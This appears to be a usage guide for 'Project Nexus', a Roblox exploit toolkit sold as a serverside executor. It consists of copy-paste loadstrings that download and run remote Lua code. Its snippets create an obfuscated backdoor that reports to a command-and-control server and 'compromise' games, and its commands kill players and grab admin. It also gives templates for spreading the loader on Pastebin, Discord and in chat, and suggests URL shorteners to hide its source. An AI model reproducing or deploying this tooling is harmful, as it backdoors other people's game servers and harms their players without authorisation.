# Project Nexus - Loadstring Collection

Quick reference for all loadstrings. Just copy and paste!

## Main Loadstrings

### Full Auto Loader (Recommended)
Loads everything, scans, compromises, shows GUI.

```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

**Press Right Shift to toggle GUI**

---

### Direct Main Module
Just loads core without auto-initialization.

```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/main.lua"))()
```

---

## Individual Module Loadstrings

### Scanner Only
```lua
local Scanner = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/core/scanner.lua"))()
local scanner = Scanner.new()
local results = scanner:ScanGame(game)
print(scanner:ExportResults(results, "text"))
```

### Injector Only
```lua
local Injector = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/core/injector.lua"))()
local injector = Injector.new("http://YOUR_C2_SERVER:8080")
local backdoor = injector:CreateObfuscatedBackdoor("http://YOUR_C2_SERVER:8080")
print(backdoor)
```

### Executor Only
```lua
local Executor = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/core/executor.lua"))()
local executor = Executor.new(connection)
executor:Execute([[print("Serverside code")]])
```

### GUI Only
```lua
local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/client/gui.lua"))()
local gui = GUI.new()
gui:Create()
gui:Toggle()
```

---

## Example Scripts

### Basic Usage Examples
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/examples/basic_usage.lua"))()
```

### Advanced Injection Examples
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/examples/advanced_injection.lua"))()
```

---

## Custom Configurations

### With Custom C&C Server
```lua
getgenv().NexusConfig = {
    commandServer = "http://YOUR_IP:8080",
    autoScan = true,
    showGui = true
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

### No Auto-Init (Manual Control)
```lua
getgenv().NexusAutoInit = false
local Nexus = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/main.lua"))()

local nexus = Nexus.new({
    commandServer = "http://localhost:8080",
    autoScan = false
})

nexus:Initialize()
nexus:ScanCurrentGame()
nexus:Compromise("backdoor")
```

---

## Pastebin/Rentry Format

Use this template for sharing:

```
Project Nexus - FE Serverside Executor

Load:
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()

Controls:
- Right Shift: Toggle GUI
- Access: _G.NexusInstance

Commands:
nexus:Command("kill", "player")
nexus:Command("tp", "player", Vector3.new(0,50,0))
nexus:Command("admin")
nexus:Execute([[code]])
```

---

## Discord Embed Format

```markdown
**Project Nexus v1.0**
Advanced FE Serverside Executor

**Load:**
`‎`‎`lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
`‎`‎`

**Features:**
✓ Vulnerability Scanner
✓ Multi-Vector Compromise
✓ Serverside Execution
✓ Remote C&C
✓ GUI Interface

**Controls:** Right Shift to toggle
```

---

## One-Liner for Chat

```
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

---

## URL Shortener (Optional)

Shorten your GitHub raw URL:

1. **bit.ly**: `https://bit.ly/nexus-loader` → your GitHub URL
2. **tinyurl.com**: `https://tinyurl.com/nexus-ss` → your GitHub URL
3. **is.gd**: `https://is.gd/nexus` → your GitHub URL

Then use:
```lua
loadstring(game:HttpGet("https://bit.ly/nexus-loader"))()
```

---

## Important Notes

1. **Replace `YOUR_USERNAME`** with your actual GitHub username in all URLs
2. **Repository must be public** for raw.githubusercontent.com to work
3. **For private repos**, use GitHub personal access token:
   ```lua
   local token = "ghp_YOUR_TOKEN_HERE"
   local url = "https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"
   loadstring(game:HttpGet(url, true, {["Authorization"] = "token " .. token}))()
   ```

---

## Testing Your Loadstring

Before sharing, test in a private game:

1. Copy loadstring
2. Paste in executor
3. Execute
4. Check console for errors
5. Verify GUI loads (Right Shift)
6. Test commands

If it works = ready to share!

---

**Project Nexus** - Copy, paste, execute.
